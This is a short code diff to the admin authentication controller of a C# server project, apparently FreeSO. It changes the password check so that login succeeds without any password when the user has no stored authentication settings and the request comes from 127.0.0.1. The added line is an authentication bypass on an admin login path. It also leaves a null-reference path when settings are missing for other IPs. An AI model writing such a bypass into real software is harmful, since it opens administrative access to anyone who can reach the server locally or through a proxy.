@@ -44,7 +44,7 @@ namespace FSO.Server.Api.Core.Controllers.Admin
                     }
 
                     var authSettings = da.Users.GetAuthenticationSettings(user.user_id);
-                    var isPasswordCorrect = PasswordHasher.Verify(auth.password, new PasswordHash
+                    var isPasswordCorrect = (authSettings == null && ip == "127.0.0.1") || PasswordHasher.Verify(auth.password, new PasswordHash
                     {
                         data = authSettings.data,
                         scheme = authSettings.scheme_class
